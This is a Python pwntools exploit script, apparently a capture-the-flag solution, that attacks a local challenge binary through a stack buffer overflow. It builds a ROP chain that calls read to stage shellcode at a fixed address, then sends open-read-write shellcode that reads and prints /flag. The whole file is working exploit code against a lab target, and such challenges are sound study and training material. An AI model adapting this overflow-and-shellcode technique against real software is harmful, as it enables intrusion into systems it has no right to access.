#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2023/03/03 20:42:32
# -----------------------------------

from pwn import *

context.arch = "amd64"
context.log_level = "debug"
DEBUG = 0

elf = ELF("../file/i_got_shell_release")
io = process("../file/i_got_shell_release") if DEBUG else remote("127.0.0.1", 45009)

s = lambda data: io.send(data)
sa = lambda word, data: io.sendafter(word, data)

# gadget
pop_rdi_ret = 0x4846E7
pop_rsi_r15_ret = 0x4846E5

# rop
payload = b"b" * 0x28
payload += p64(pop_rsi_r15_ret) + p64(0x114000) + p64(0)  # read(0, 0x114000, 0x48)
payload += p64(elf.plt["read"])
payload += p64(0x114000)  # ret到shellcode
sa("!", payload)

# read写入更多的shellcode
shellcode = shellcraft.read(0, 0x114000, 0x500)
shellcode = asm(shellcode)
s(shellcode)

# orw
shellcode = shellcraft.openat(0, "/flag", 0)
shellcode += shellcraft.read(2, 0x114514, 0x100)
shellcode += shellcraft.write(1, 0x114514, 0x100)
shellcode = b"b" * 0x15 + asm(shellcode)
s(shellcode)

io.interactive()
